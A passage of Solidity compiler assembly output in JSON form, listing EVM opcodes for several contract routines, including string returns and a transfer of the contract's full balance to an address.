											"source": 9,
											"value": "6"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "CALLVALUE",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "REVERT",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "tag",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "21"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "22"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "tag",
											"source": 9,
											"value": "21"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "tag",
											"source": 9,
											"value": "23"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "25"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP5",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "23"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "tag",
											"source": 9,
											"value": "25"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "1F"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "26"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "100"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "EXP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "NOT",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "tag",
											"source": 9,
											"value": "26"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP3",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "RETURN",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "tag",
											"source": 9,
											"value": "11"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SLOAD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "100"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MUL",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "2"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DIV",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "1F"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DIV",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MUL",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP3",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SLOAD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "100"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MUL",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "2"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DIV",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "27"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "1F"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "28"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "100"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SLOAD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DIV",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MUL",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "27"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "tag",
											"source": 9,
											"value": "28"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "KECCAK256",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "tag",
											"source": 9,
											"value": "29"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SLOAD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "GT",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "29"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "1F"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "tag",
											"source": 9,
											"value": "27"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMP",
											"source": 9,
											"value": "[out]"
										},
										{
											"begin": 15388,
											"end": 15575,
											"name": "tag",
											"source": 9,
											"value": "17"
										},
										{
											"begin": 15388,
											"end": 15575,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "PUSH",
											"source": 9,
											"value": "CF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB"
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "PUSH",
											"source": 9,
											"value": "38"
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "PUSH data",
											"source": 9,
											"value": "9FB03945078BC6C7000C07D459687B271AE0ADC059777DEE3669B3C70B385107"
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "PUSH",
											"source": 9,
											"value": "38"
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "CODECOPY",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 15436,
											"end": 15499,
											"name": "LOG1",
											"source": 9
										},
										{
											"begin": 15518,
											"end": 15534,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "31"
										},
										{
											"begin": 15518,
											"end": 15532,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "32"
										},
										{
											"begin": 15518,
											"end": 15534,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 15518,
											"end": 15534,
											"name": "tag",
											"source": 9,
											"value": "31"
										},
										{
											"begin": 15518,
											"end": 15534,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15544,
											"name": "PUSH",
											"source": 9,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 15510,
											"end": 15544,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "PUSH",
											"source": 9,
											"value": "8FC"
										},
										{
											"begin": 15545,
											"end": 15566,
											"name": "SELFBALANCE",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "MUL",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "DUP6",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "DUP9",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "DUP9",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "CALL",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "SWAP4",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "34"
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "RETURNDATASIZE",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "RETURNDATACOPY",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "RETURNDATASIZE",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "REVERT",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "tag",
											"source": 9,
											"value": "34"
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 15510,
											"end": 15567,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15388,
											"end": 15575,
											"name": "JUMP",
											"source": 9,
											"value": "[out]"
										},
										{
											"begin": 15693,
											"end": 15883,
											"name": "tag",
											"source": 9,
											"value": "19"
										},
										{
											"begin": 15693,
											"end": 15883,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "PUSH",
											"source": 9,
